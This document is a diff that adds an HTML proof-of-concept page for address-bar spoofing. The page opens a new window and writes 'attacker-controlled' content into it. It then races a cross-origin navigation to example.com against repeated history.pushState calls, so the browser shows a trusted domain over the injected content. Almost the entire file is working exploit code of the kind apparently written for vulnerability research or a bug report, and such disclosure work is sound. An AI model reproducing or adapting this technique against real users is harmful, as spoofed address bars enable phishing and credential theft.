@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Address Bar Sync PoC</title>
+</head>
+<body>
+
+<button id="run">Run PoC</button>
+
+<script>
+let w;
+
+document.getElementById('run').addEventListener('click', () => {
+  // 1. Open a new window via direct user gesture (no popup blocker)
+  w = window.open('about:blank', 'poc_window');
+
+  if (!w) return;
+
+  // 2. Inject attacker-controlled (our) content
+  w.document.open();
+  w.document.write(`
+    <style>
+      body { font-family: Arial; padding: 20px }
+      h2 { color: #d00 }
+    </style>
+    <h2>PoC Content</h2>
+    <p>This content is rendered from the attacker-controlled page.</p>
+    <p><b>Expected domain:</b> example.com</p>
+  `);
+  w.document.close();
+
+  // 3. Trigger navigation + race
+  setTimeout(() => {
+    try {
+      // navigation to cross-origin
+      w.location.href = 'https://example.com';
+    } catch (e) {}
+  }, 30);
+
+  // 4. History / location race
+  setInterval(() => {
+    try {
+      // force address bar state
+      w.history.pushState({}, '', 'https://example.com/');
+    } catch (e) {}
+  }, 1);
+});
+</script>
+
+</body>
+</html>
